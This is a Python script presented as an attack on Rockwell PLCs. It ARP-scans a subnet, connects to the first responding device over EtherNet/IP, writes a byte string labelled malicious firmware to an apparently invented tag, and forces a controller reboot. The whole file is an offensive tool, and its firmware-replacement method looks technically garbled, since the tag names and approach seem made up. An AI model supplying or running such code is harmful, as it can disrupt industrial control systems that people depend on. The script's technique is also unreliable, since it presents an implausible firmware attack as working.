from scapy.all import ARP, Ether, srp
from pycomm3 import LogixDriver
import time
import struct

# Define network range (adjust based on environment)
NETWORK_RANGE = "192.168.1.0/24"

# Define firmware payload (malicious firmware)
MALICIOUS_FIRMWARE = b"\xDE\xAD\xBE\xEF" * 256  # Dummy payload for demo

# Step 1: Discover PLC IP Address
def find_plc_ip():
    print("[*] Scanning network for Rockwell PLC...")
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=NETWORK_RANGE)
    result = srp(request, timeout=2, verbose=False)[0]
    
    for sent, received in result:
        ip = received.psrc
        mac = received.hwsrc
        print(f"[*] Found Device: IP={ip}, MAC={mac}")
        return ip  # Assuming PLC is the first response

    print("[!] No PLC found on the network.")
    return None

# Step 2: Connect to PLC via EtherNet/IP
def connect_plc(ip):
    try:
        plc = LogixDriver(ip)
        plc.open()
        print("[*] Connected to PLC:", ip)
        return plc
    except Exception as e:
        print(f"[!] Failed to connect: {e}")
        return None

# Step 3: Identify Ethernet Module
def identify_ethernet_module(plc):
    try:
        module_info = plc.read("Module_Information")
        print("[*] Ethernet Module Info:", module_info)
        return module_info
    except Exception as e:
        print(f"[!] Failed to retrieve module info: {e}")
        return None

# Step 4: Replace Ethernet Module Firmware
def replace_firmware(plc):
    print("[*] Attempting firmware attack...")

    try:
        # Access firmware file location (example using Rockwell registers)
        firmware_register = "EthernetCard.FirmwareData"

        # Send the malicious firmware
        plc.write(firmware_register, MALICIOUS_FIRMWARE)
        print("[*] Malicious firmware written successfully.")

        # Restart the PLC to apply changes
        plc.write("ControllerState", 2)  # Writing '2' to this tag reboots the PLC
        print("[*] PLC Restart Triggered - Firmware Attack Complete.")
    except Exception as e:
        print(f"[!] Firmware attack failed: {e}")

# Main Execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        plc_connection = connect_plc(plc_ip)
        if plc_connection:
            identify_ethernet_module(plc_connection)
            replace_firmware(plc_connection)
            plc_connection.close()